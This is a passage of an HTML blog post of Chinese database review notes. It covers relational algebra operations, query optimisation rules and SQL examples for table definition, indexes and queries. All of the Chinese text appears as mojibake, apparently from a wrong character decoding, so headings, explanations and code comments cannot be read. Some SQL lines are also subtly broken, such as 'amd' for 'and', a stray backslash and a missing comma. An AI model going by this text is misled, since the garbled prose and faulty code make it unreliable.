IntegrityÔºâ</strong>ÔºöÂèçÊò†Êüê‰∏ÄÂÖ∑‰ΩìÂ∫îÁî®ÊâÄÊ∂âÂèäÁöÑÊï∞ÊçÆÂøÖÈ°ªÊª°Ë∂≥ÁöÑËØ≠‰πâË¶ÅÊ±Ç</p><h2 id="2-3-ÂÖ≥Á≥ª‰ª£Êï∞-‰º†ÁªüÈõÜÂêà"><a href="#2-3-ÂÖ≥Á≥ª‰ª£Êï∞-‰º†ÁªüÈõÜÂêà" class="headerlink" title="2.3 ÂÖ≥Á≥ª‰ª£Êï∞ ‰º†ÁªüÈõÜÂêà"></a>2.3 ÂÖ≥Á≥ª‰ª£Êï∞ ‰º†ÁªüÈõÜÂêà</h2><p>Áõ∏ÂÆπÂÖ≥Á≥ª‰∏∫ÂâçÊèê</p><p>Âπ∂ÔºåÂ∑ÆÔºå‰∫§ËøêÁÆó</p><p>Âπø‰πâÁ¨õÂç°Â∞îÁßØËøêÁÆó</p><h2 id="2-4-ÂÖ≥Á≥ª‰ª£Êï∞ËøêÁÆó"><a href="#2-4-ÂÖ≥Á≥ª‰ª£Êï∞ËøêÁÆó" class="headerlink" title="2.4 ÂÖ≥Á≥ª‰ª£Êï∞ËøêÁÆó"></a>2.4 ÂÖ≥Á≥ª‰ª£Êï∞ËøêÁÆó</h2><h3 id="ÈÄâÊã©"><a href="#ÈÄâÊã©" class="headerlink" title="ÈÄâÊã©"></a>ÈÄâÊã©</h3><p>ÈÄâÊã©ËøêÁÆóÊòØ‰ªéÂÖ≥Á≥ªR‰∏≠ÈÄâÂèñ‰ΩøÈÄªËæëË°®ËææÂºèF‰∏∫ÁúüÁöÑÂÖÉÁªÑÔºåÊòØ‰ªéË°åÁöÑËßíÂ∫¶ËøõË°åÁöÑËøêÁÆó</p><p><img src="/2021/05/03/Database-review/20190629192739586.png" alt="img"></p><p>Â¶ÇÊü•ËØ¢‰ø°ÊÅØÁ≥ªÔºàISÁ≥ªÔºâÂÖ®‰ΩìÂ≠¶Áîü  <img src="/2021/05/03/Database-review/20190629192743765.png" alt="img"></p><h3 id="ÊäïÂΩ±"><a href="#ÊäïÂΩ±" class="headerlink" title="ÊäïÂΩ±"></a>ÊäïÂΩ±</h3><p>ÊäïÂΩ±Êìç‰Ωú‰∏ªË¶ÅÊòØ‰ªéÂàóÁöÑËßíÂ∫¶ËøõË°åËøêÁÆóÔºå‰ΩÜÊäïÂΩ±ÊàêÂäü‰πãÂêé‰∏ç‰ªÖÂèñÊ∂à‰∫ÜÂéüÂÖ≥Á≥ª‰∏≠ÁöÑÊüê‰∫õÂàóÔºåËÄå‰∏îËøòÂèØËÉΩÂèñÊ∂àÊüê‰∫õÂÖÉÁªÑÔºàÈÅøÂÖçÈáçÂ§çË°åÔºâ</p><p><img src="/2021/05/03/Database-review/20190629192754689.png" alt="img"></p><p>Â¶ÇÊü•ËØ¢Â≠¶ÁîüÁöÑÂßìÂêçÂíåÊâÄÂú®Á≥ª <img src="/2021/05/03/Database-review/20190629192758641.png" alt="img"></p><h3 id="ËøûÊé•"><a href="#ËøûÊé•" class="headerlink" title="ËøûÊé•"></a>ËøûÊé•</h3><p>ËøûÊé•ËøêÁÆóÁöÑÂê´‰πâÔºö‰ªé‰∏§‰∏™ÂÖ≥Á≥ªÁöÑÁ¨õÂç°Â∞îÁßØ‰∏≠ÈÄâÂèñÂ±û ÊÄßÈó¥Êª°Ë∂≥‰∏ÄÂÆöÊù°‰ª∂ÁöÑÂÖÉÁªÑ</p><p><strong>Á≠âÂÄºËøûÊé•</strong>ÔºöŒ∏‰∏∫‚Äô=‚ÄôÁöÑËøûÊé•ËøêÁÆóÁß∞‰∏∫Á≠âÂÄºËøûÊé•ÔºåÂç≥ÈÄâÂèñÂ±ûÊÄßÁõ∏Á≠âÁöÑÂÖÉÁªÑ</p><p><strong>Ëá™ÁÑ∂ËøûÊé•</strong>ÔºöÁâπÊÆäÁöÑÁ≠âÂÄºËøûÊé•Ôºå‰∏§‰∏™ÂÖ≥Á≥ª‰∏≠ËøõË°åÊØîËæÉÁöÑÂàÜÈáèÂøÖÈ°ªÊòØÁõ∏ÂêåÁöÑÂ±ûÊÄßÁªÑÔºåÂú®ÁªìÊûú‰∏≠Ë¶ÅÊääÈáçÂ§çÁöÑÂ±ûÊÄßÂàóÂéªÊéâ</p><p>‰∏§ËÄÖÁöÑÂå∫Âà´Ôºö</p><ol><li>‰∏ÄËà¨ÁöÑËøûÊé•Êìç‰ΩúÊòØ‰ªéË°åÁöÑËßíÂ∫¶ËøõË°åËøêÁÆóÁöÑÔºåËá™ÁÑ∂ËøûÊé•ËøòÈúÄË¶ÅÂèñÊ∂àÈáçÂ§çÂàóÔºåÊâÄ‰ª•ÊòØÂêåÊó∂‰ªéË°åÂíåÂàóÁöÑËßíÂ∫¶ËøõË°åËøêÁÆó„ÄÇ</li><li><strong>Ëá™ÁÑ∂ËøûÊé•ÊòØÁâπÊÆäÁöÑÁ≠âÂÄºËøûÊé•ÔºåÁõ∏ÂêåÁöÑÂ±ûÊÄßÁªÑËøõË°åÊØîËæÉÔºåÂπ∂ÂéªÈô§ÈáçÂ§çÁöÑÂ±ûÊÄßÂàó„ÄÇÂç≥Á¨õÂç°Â∞îÁßØÈáåÊâæÂá∫BÁõ∏Á≠âÁöÑÁÑ∂ÂêéÂêàÂπ∂R.BÂíåS.B‰∏∫B</strong>„ÄÇ</li><li>Á≠âÂÄºËøûÊé•ÂèØ‰ª•‰∏çÊòØÂÖ¨ÂÖ±Â±ûÊÄßÔºå‰ΩÜËá™ÁÑ∂ËøûÊé•ÂøÖÈ°ªÊòØÂÖ¨ÂÖ±Â±ûÊÄß„ÄÇ</li></ol><h3 id="Èô§"><a href="#Èô§" class="headerlink" title="Èô§"></a>Èô§</h3><p>Èô§Êìç‰ΩúÊòØÂêåÊó∂‰ªéË°åÂíåÂàóÁöÑËßíÂ∫¶ËøõË°åËøêÁÆóÁöÑ</p><p><img src="/2021/05/03/Database-review/20190629192919637.png" alt="img"></p><p><img src="/2021/05/03/Database-review/20190629192922956.png" alt="img"></p><p>ÈÄöÂ∏∏ËøêÁî®‰∫é‚ÄúÊâÄÊúâÁöÑ‚ÄùËøôÁ±ªÊÉÖÂÜµ„ÄÇ</p><p><img src="/2021/05/03/Database-review/20190629192929734.png" alt="img"></p><p>‰æãÈ¢òÔºö</p><p><img src="/2021/05/03/Database-review/image-20210505142838842.png" alt="image-20210505142838842"></p><h2 id="2-5-Êü•ËØ¢‰ºòÂåñ"><a href="#2-5-Êü•ËØ¢‰ºòÂåñ" class="headerlink" title="2.5 Êü•ËØ¢‰ºòÂåñ"></a>2.5 Êü•ËØ¢‰ºòÂåñ</h2><p>‰∏âÁßç‰ºòÂåñÔºö‰ª£Êï∞‰ºòÂåñ„ÄÅÁâ©ÁêÜ‰ºòÂåñÂíå‰ª£‰ª∑‰º∞ÁÆó‰ºòÂåñ</p><h3 id="Á≠â‰ª∑ÂèòÊç¢ËßÑÂàôÔºö"><a href="#Á≠â‰ª∑ÂèòÊç¢ËßÑÂàôÔºö" class="headerlink" title="Á≠â‰ª∑ÂèòÊç¢ËßÑÂàôÔºö"></a><strong>Á≠â‰ª∑ÂèòÊç¢ËßÑÂàôÔºö</strong></h3><ol><li>ËøûÊé•„ÄÅÁ¨õÂç°Â∞îÁßØ‰∫§Êç¢Âæã<img src="/2021/05/03/Database-review/image-20210505152604468.png" alt="image-20210505152604468"></li><li>ËøûÊé•„ÄÅÁ¨õÂç°Â∞îÁßØÁªìÂêàÂæã<img src="/2021/05/03/Database-review/image-20210505152614300.png" alt="image-20210505152614300"></li><li>ÊäïÂΩ±ÁöÑ‰∏≤Êé•ÂÆöÂæã</li><li>ÈÄâÊã©ÁöÑ‰∏≤Êé•ÂÆöÂæã</li><li>ÈÄâÊã©ÂíåÊäïÂΩ±ÁöÑ‰∫§Êç¢Âæã<img src="/2021/05/03/Database-review/image-20210505152850683.png" alt="image-20210505152850683"></li><li>ÈÄâÊã©ÂíåÁ¨õÂç°Â∞îÁßØÁöÑ‰∫§Êç¢Âæã<img src="/2021/05/03/Database-review/image-20210505153114367.png" alt="image-20210505153114367"></li></ol><h3 id="Êü•ËØ¢‰ºòÂåñÁ≠ñÁï•"><a href="#Êü•ËØ¢‰ºòÂåñÁ≠ñÁï•" class="headerlink" title="Êü•ËØ¢‰ºòÂåñÁ≠ñÁï•"></a>Êü•ËØ¢‰ºòÂåñÁ≠ñÁï•</h3><ol><li>Â∞ΩÂèØËÉΩÊó©Âú∞ÊâßË°åÈÄâÊã©Êìç‰Ωú</li><li>ÂêàÂπ∂Á¨õÂç°Â∞îÁßØÂíåÂÖ∂ÂêéÁöÑÈÄâÊã©Êìç‰ΩúÔºå‰ΩøÂÖ∂Áß∞‰∏∫‰∏Ä‰∏™ËøûÊé•ËøêÁÆó</li><li>ÂêàÂπ∂ËøûÁª≠ÁöÑÈÄâÊã©ÂíåÊäïÂΩ±Êìç‰Ωú</li></ol><h3 id="‰ºòÂåñÁÆóÊ≥ï"><a href="#‰ºòÂåñÁÆóÊ≥ï" class="headerlink" title="‰ºòÂåñÁÆóÊ≥ï"></a>‰ºòÂåñÁÆóÊ≥ï</h3><p><img src="/2021/05/03/Database-review/image-20210505154446428.png" alt="image-20210505154446428"></p><h1 id="0x03-Á¨¨‰∏âÁ´†-ÂÖ≥Á≥ªÊï∞ÊçÆÂ∫ìÊ†áÂáÜËØ≠Ë®ÄSQL"><a href="#0x03-Á¨¨‰∏âÁ´†-ÂÖ≥Á≥ªÊï∞ÊçÆÂ∫ìÊ†áÂáÜËØ≠Ë®ÄSQL" class="headerlink" title="0x03 Á¨¨‰∏âÁ´† ÂÖ≥Á≥ªÊï∞ÊçÆÂ∫ìÊ†áÂáÜËØ≠Ë®ÄSQL"></a>0x03 Á¨¨‰∏âÁ´† ÂÖ≥Á≥ªÊï∞ÊçÆÂ∫ìÊ†áÂáÜËØ≠Ë®ÄSQL</h1><h2 id="3-1-SQLÊ¶ÇËø∞"><a href="#3-1-SQLÊ¶ÇËø∞" class="headerlink" title="3.1 SQLÊ¶ÇËø∞"></a>3.1 SQLÊ¶ÇËø∞</h2><h2 id="3-2-Êï∞ÊçÆÂÆö‰πâ"><a href="#3-2-Êï∞ÊçÆÂÆö‰πâ" class="headerlink" title="3.2 Êï∞ÊçÆÂÆö‰πâ"></a>3.2 Êï∞ÊçÆÂÆö‰πâ</h2><h3 id="ÂÆö‰πâÂü∫Êú¨Ë°®"><a href="#ÂÆö‰πâÂü∫Êú¨Ë°®" class="headerlink" title="ÂÆö‰πâÂü∫Êú¨Ë°®"></a>ÂÆö‰πâÂü∫Êú¨Ë°®</h3><p><img src="/2021/05/03/Database-review/image-20210505161003549.png" alt="image-20210505161003549"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> student(</span><br><span class="line"><span class="keyword">id</span> <span class="built_in">int</span> auto_increment primary <span class="keyword">key</span>, // <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">UNIQUE</span></span><br><span class="line"><span class="keyword">name</span> <span class="built_in">varchar</span>(<span class="number">50</span>),</span><br><span class="line">sex <span class="built_in">varchar</span>(<span class="number">20</span>),</span><br><span class="line"><span class="built_in">date</span> <span class="built_in">varchar</span>(<span class="number">50</span>),</span><br><span class="line"><span class="keyword">content</span> <span class="built_in">varchar</span>(<span class="number">100</span>)</span><br><span class="line">)<span class="keyword">default</span> <span class="keyword">charset</span>=utf8;</span><br><span class="line"><span class="comment">#char(n) varchar(n)</span></span><br><span class="line"><span class="comment">#binary(n) varbinary(n)</span></span><br><span class="line"><span class="comment">#int smallint</span></span><br><span class="line"><span class="comment">#float double</span></span><br><span class="line"><span class="comment">#date</span></span><br><span class="line"><span class="comment">#time</span></span><br><span class="line"><span class="comment">#timestamp</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#ÂÆû‰ΩìÂÆåÊï¥ÊÄßÁ∫¶Êùü</span></span><br><span class="line"><span class="comment">#‰∏ªÁ†ÅÁ∫¶Êùü PRIMARY KEY</span></span><br><span class="line"><span class="comment">#ÂèÇÁÖßÂÆåÊï¥ÊÄß</span></span><br><span class="line"><span class="comment">#Â§ñÁ†ÅÁ∫¶Êùü FOREIGN KEY</span></span><br><span class="line"><span class="comment">#Áî®Êà∑Ëá™ÂÆö‰πâÂÆåÊï¥ÊÄß</span></span><br><span class="line"><span class="comment">#ÈùûÁ©∫ NOT NULL</span></span><br><span class="line"><span class="comment">#ÂîØ‰∏Ä UNIQUE</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> student(</span><br><span class="line"><span class="keyword">id</span> <span class="built_in">int</span> <span class="keyword">references</span> s(<span class="keyword">key</span>),</span><br><span class="line"><span class="keyword">name</span> <span class="built_in">varchar</span>(<span class="number">50</span>) <span class="keyword">default</span> <span class="string">'xx'</span>,</span><br><span class="line">sex <span class="built_in">varchar</span>(<span class="number">20</span>) <span class="keyword">check</span>(sex=<span class="string">"male"</span> <span class="keyword">or</span> sex=<span class="string">"female"</span>),</span><br><span class="line"><span class="built_in">date</span> <span class="built_in">varchar</span>(<span class="number">50</span>),</span><br><span class="line"><span class="keyword">content</span> <span class="built_in">varchar</span>(<span class="number">100</span>),</span><br><span class="line">primary <span class="keyword">key</span>(<span class="keyword">id</span> ,<span class="keyword">name</span>)</span><br><span class="line"><span class="keyword">foreign</span> <span class="keyword">key</span>(<span class="keyword">id</span>) <span class="keyword">references</span> s(<span class="keyword">key</span>)</span><br><span class="line">)<span class="keyword">default</span> <span class="keyword">charset</span>=utf8;</span><br></pre></td></tr></table></figure><h3 id="‰øÆÊîπË°®ÁªìÊûÑ"><a href="#‰øÆÊîπË°®ÁªìÊûÑ" class="headerlink" title="‰øÆÊîπË°®ÁªìÊûÑ"></a>‰øÆÊîπË°®ÁªìÊûÑ</h3><p><img src="/2021/05/03/Database-review/image-20210505170855019.png" alt="image-20210505170855019"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">//Êñ∞Â¢ûÂ±ûÊÄß</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> student <span class="keyword">add</span> phone <span class="built_in">int</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>;</span><br><span class="line">//Âà†Èô§Â±ûÊÄß</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> student <span class="keyword">drop</span> primary <span class="keyword">key</span>;</span><br><span class="line">//Êñ∞Â¢ûÂ§ñÁ†ÅÁ∫¶ÊùüÂêç</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> student <span class="keyword">add</span> <span class="keyword">constraint</span> sno_key <span class="keyword">foreign</span> <span class="keyword">key</span>(<span class="keyword">id</span>) <span class="keyword">references</span> s(<span class="keyword">id</span>);</span><br><span class="line">//ÈÄöËøáÁ∫¶ÊùüÂêçÂà†Èô§</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> student <span class="keyword">drop</span> <span class="keyword">foreign</span> <span class="keyword">key</span> sno_key;</span><br><span class="line">//‰øÆÊîπÂ±ûÊÄß</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> student <span class="keyword">modify</span> phone <span class="built_in">smallint</span>;</span><br><span class="line">//Âà†Èô§Âü∫Êú¨Ë°®</span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> student;</span><br></pre></td></tr></table></figure><h2 id="3-3-Á¥¢Âºï"><a href="#3-3-Á¥¢Âºï" class="headerlink" title="3.3 Á¥¢Âºï"></a>3.3 Á¥¢Âºï</h2><p><img src="/2021/05/03/Database-review/image-20210505172628228.png" alt="image-20210505172628228"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//Âª∫Á´ãÁ¥¢Âºï</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">unique</span> <span class="keyword">index</span> Stusno <span class="keyword">on</span> student(<span class="keyword">sid</span> <span class="keyword">ASC</span>);</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">unique</span> <span class="keyword">index</span> Coucno <span class="keyword">on</span> course(cid <span class="keyword">ASC</span>);</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">unique</span> <span class="keyword">index</span> SCno <span class="keyword">on</span> study(<span class="keyword">id</span> <span class="keyword">ASC</span>,cid <span class="keyword">DESC</span>);</span><br><span class="line">//Âà†Èô§Á¥¢Âºï</span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">index</span> Stusno;</span><br></pre></td></tr></table></figure><h2 id="3-4-ÂçïË°®Êü•ËØ¢"><a href="#3-4-ÂçïË°®Êü•ËØ¢" class="headerlink" title="3.4 ÂçïË°®Êü•ËØ¢"></a>3.4 ÂçïË°®Êü•ËØ¢</h2><p><img src="/2021/05/03/Database-review/image-20210505184519452.png" alt="image-20210505184519452"></p><p><strong>whereÂ≠êÂè•Â∏∏Áî®Êü•ËØ¢Êù°‰ª∂</strong></p><p><img src="/2021/05/03/Database-review/image-20210505184800139.png" alt="image-20210505184800139"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">//ËÅöÈõÜÂáΩÊï∞</span><br><span class="line">COUNTÔºà*Ôºâ                                    ÁªüËÆ°ÂÖÉÁªÑ‰∏™Êï∞  </span><br><span class="line">COUNTÔºà[DISTINCT|ALL] &lt;ÂàóÂêç&gt;Ôºâ  ÁªüËÆ°‰∏ÄÂàó‰∏≠ÂÄºÁöÑ‰∏™Êï∞</span><br><span class="line">SUMÔºà[DISTINCT|ALL] &lt;ÂàóÂêç&gt;Ôºâ   ËÆ°ÁÆó‰∏ÄÂàóÂÄºÁöÑÊÄªÂíåÔºàÊ≠§ÂàóÂøÖÈ°ª‰∏∫Êï∞ÂÄºÂûãÔºâ</span><br><span class="line">AVGÔºà[DISTINCT|ALL] &lt;ÂàóÂêç&gt;Ôºâ            ËÆ°ÁÆó‰∏ÄÂàóÂÄºÁöÑÂπ≥ÂùáÂÄºÔºàÊ≠§ÂàóÂøÖÈ°ª‰∏∫Êï∞ÂÄºÂûãÔºâ</span><br><span class="line">MAXÔºà[DISTINCT|ALL] &lt;ÂàóÂêç&gt;Ôºâ      Ê±Ç‰∏ÄÂàó‰∏≠ÁöÑÊúÄÂ§ßÂÄº</span><br><span class="line">MINÔºà[DISTINCT|ALL] &lt;ÂàóÂêç&gt;Ôºâ       Ê±Ç‰∏ÄÂàó‰∏≠ÁöÑÊúÄÂ∞èÂÄº</span><br><span class="line">Â¶ÇÊûúÊåáÂÆöDISTINCTÁü≠ËØ≠ÔºåÂàôË°®Á§∫Âú®ËÆ°ÁÆóÊó∂ÂèñÊ∂àÊåáÂÆöÂàó‰∏≠ÁöÑÈáçÂ§çÂÄºÔºåALL‰∏∫Áº∫ÁúÅÂÄºÔºåË°®Á§∫‰∏çÂèñÊ∂àÈáçÂ§çÂÄº</span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">COUNT</span>(*) <span class="keyword">FROM</span> Student <span class="comment">/* Êü•ËØ¢Â≠¶ÁîüÊÄª‰∫∫Êï∞ */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//<span class="keyword">where</span>Ë∞ìËØçeg</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> student <span class="keyword">where</span> Â≠¶Èô¢=<span class="string">"ËÆ°ÁÆóÊú∫"</span> <span class="keyword">and</span> Âá∫ÁîüÂπ¥‰ªΩ &gt;=<span class="number">2000</span>;</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> student <span class="keyword">where</span> Âá∫ÁîüÂπ¥‰ªΩ <span class="keyword">between</span> <span class="number">1996</span> amd <span class="number">1998</span>;</span><br><span class="line"><span class="keyword">select</span> sno,sname <span class="keyword">from</span> student <span class="keyword">where</span> Â≠¶Èô¢ <span class="keyword">in</span> (<span class="string">"ËÆ°ÁÆóÊú∫"</span>,<span class="string">"‰ø°Áîµ"</span>);</span><br><span class="line">//a%b ‰ª•aÂºÄÂ§¥bÁªìÂ∞æ‰ªªÊÑèÈïøÂ∫¶ÁöÑÂ≠óÁ¨¶‰∏≤</span><br><span class="line">//a_b ‰ª•aÂºÄÂ§¥bÁªìÂ∞æ3ÈïøÂ∫¶ÁöÑÂ≠óÁ¨¶‰∏≤</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> student <span class="keyword">where</span> sname <span class="keyword">like</span> <span class="string">"Áéã%"</span> ESCAPE <span class="string">"\ "</span>;\</span><br><span class="line"><span class="keyword">select</span> sno,sname <span class="keyword">from</span> student <span class="keyword">where</span> Â≠¶Èô¢ <span class="keyword">is</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">//ÈõÜÂáΩÊï∞eg</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">as</span> ÊÄª‰∫∫Êï∞ <span class="keyword">from</span> student;</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">AVG</span>(<span class="keyword">year</span>(<span class="keyword">now</span>())-Âá∫ÁîüÂπ¥‰ªΩ) <span class="keyword">as</span> Âπ≥ÂùáÂπ¥ÈæÑ <span class="keyword">from</span> student;</span><br><span class="line"></span><br><span class="line">//group by eg</span><br><span class="line"><span class="keyword">select</span> cno,<span class="keyword">count</span>(sno) <span class="keyword">as</span> ‰∫∫Êï∞ <span class="keyword">from</span> sc <span class="keyword">group</span> <span class="keyword">by</span> cno;</span><br><span class="line"><span class="keyword">select</span> sno,<span class="keyword">count</span>(cno) <span class="keyword">as</span> ÈÄâËØæÊï∞ <span class="keyword">from</span> sc <span class="keyword">where</span> sno <span class="keyword">between</span> <span class="string">'091501'</span> <span class="keyword">and</span> <span class="string">'091506'</span> <span class="keyword">group</span> <span class="keyword">by</span> sno <span class="keyword">having</span> <span class="keyword">count</span>(cno) &gt;= <span class="string">'3'</span>;</span><br></pre></td></tr></table></figure><h2 id="3-5-Â§öË°®Êü•ËØ¢"><a href="#3-5-Â§öË°®Êü•ËØ¢" class="headerlink" title="3.5 Â§öË°®Êü•ËØ¢"></a>3.5 Â§öË°®Êü•ËØ¢</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">//eg</span><br><span class="line">//Êü•ËØ¢ÈÄâ‰øÆ180101Âè∑ËØæÁ®ã‰∏îÊàêÁª©Âú®90ÂàÜ‰ª•‰∏äÁöÑÂ≠¶ÁîüÂ≠¶Âè∑ÔºåÂßìÂêçÂèäÊàêÁª©„ÄÇ</span><br><span class="line"><span class="keyword">select</span> s.sno,sname,grade </span><br><span class="line"><span class="keyword">from</span> s,sc </span><br><span class="line"><span class="keyword">where</span> s.sno=sc.sno <span class="keyword">and</span> sc.cno=<span class="string">'180101'</span> <span class="keyword">and</span> sc.grade &gt; <span class="number">90</span>;</span><br><span class="line">//Êü•ËØ¢ÈÄâ‰øÆ‰∫ÜÊï∞ÊçÆÂ∫ìÂéüÁêÜËØæÁ®ãÁöÑÂ≠¶ÁîüÁöÑÂßìÂêçÂíåÊàêÁª©„ÄÇ</span><br><span class="line"><span class="keyword">select</span> cname,grade</span><br><span class="line"><span class="keyword">from</span> s</span><br><span class="line"><span class="keyword">join</span> sc <span class="keyword">on</span> sc.sno=s.sno</span><br><span class="line"><span class="keyword">join</span> c <span class="keyword">on</span> sc.cno=c.cno</span><br><span class="line"><span class="keyword">where</span> cname = <span class="string">"Êï∞ÊçÆÂ∫ìÂéüÁêÜ"</span></span><br><span class="line">//ÁªüËÆ°ÊØè‰∏ÄÈó®ËØæÁöÑÂπ≥ÂùáÂàÜ</span><br><span class="line"><span class="keyword">select</span> cname,<span class="keyword">AVG</span>(grade) <span class="keyword">as</span> Âπ≥ÂùáÂàÜ</span><br><span class="line"><span class="keyword">from</span> c,sc</span><br><span class="line"><span class="keyword">where</span> c.cno=sc.cno</span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> cno,cname;</span><br><span class="line">//Êü•ËØ¢Âπ≥ÂùáÂàÜÈ´ò‰∫é90ÂàÜÁöÑÂ≠¶ÁîüÁöÑÂ≠¶Âè∑„ÄÅÂßìÂêç‰ª•Âèä‰ªñÁöÑÂπ≥ÂùáÂàÜÔºåÂπ∂ÊåâÂπ≥ÂùáÂàÜÈôçÂ∫èÊéíÂàó„ÄÇ</span><br><span class="line"><span class="keyword">select</span> sno,sname,<span class="keyword">AVG</span>(grade) <span class="keyword">as</span> Âπ≥ÂùáÂàÜ</span><br><span class="line"><span class="keyword">from</span> s,sc</span><br><span class="line"><span class="keyword">where</span> s.sno=sc.sno</span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> sno,sname</span><br><span class="line"><span class="keyword">having</span> <span class="keyword">AVG</span>(grade) &gt; <span class="number">90</span></span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> <span class="keyword">AVG</span>(grade) <span class="keyword">desc</span>;</span><br><span class="line"></span><br><span class="line">//Limit [offset,] count</span><br><span class="line">//Êü•ËØ¢Âπ≥ÂùáÂàÜÈ´ò‰∫é90ÂàÜÁöÑÂâç‰∫îÂêçÂ≠¶ÁîüÁöÑÂ≠¶Âè∑„ÄÅÂßìÂêç‰ª•Âèä‰ªñÁöÑÂπ≥ÂùáÂàÜ</span><br><span class="line"><span class="keyword">select</span> sno,sname,<span class="keyword">AVG</span>(grade)</span><br><span class="line"><span class="keyword">from</span> s,sc</span><br><span class="line"><span class="keyword">where</span> s.sno=sc.sno</span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> sno,sname</span><br><span class="line"><span class="keyword">having</span> <span class="keyword">AVG</span>(grade) &gt; <span class="number">90</span></span><br><span class="line"><span class="keyword">limit</span> <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line">//Ëá™ËøûÊé•</span><br><span class="line">//Êü•ËØ¢ÂíåÁéã‰∏ΩÂú®Âêå‰∏Ä‰∏™Â≠¶Èô¢Â≠¶‰π†ÁöÑÂ≠¶ÁîüÁöÑÂßìÂêç„ÄÇ</span><br><span class="line"><span class="keyword">select</span> s2.sname</span><br><span class="line"><span class="keyword">from</span> s <span class="keyword">as</span> s1,s <span class="keyword">as</span> s2</span><br><span class="line"><span class="keyword">where</span> s1.sname=<span class="string">"Áéã‰∏Ω"</span> <span class="keyword">and</span> s1.Â≠¶Èô¢=s2.Â≠¶Èô¢;</span><br></pre></td></tr></table></figure><h2 id="3-6-ÂµåÂ•óÊü•ËØ¢"><a href="#3-6-ÂµåÂ•óÊü•ËØ¢" class="headerlink" title="3.6 ÂµåÂ•óÊü•ËØ¢"></a>3.6 ÂµåÂ•óÊü•ËØ¢</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 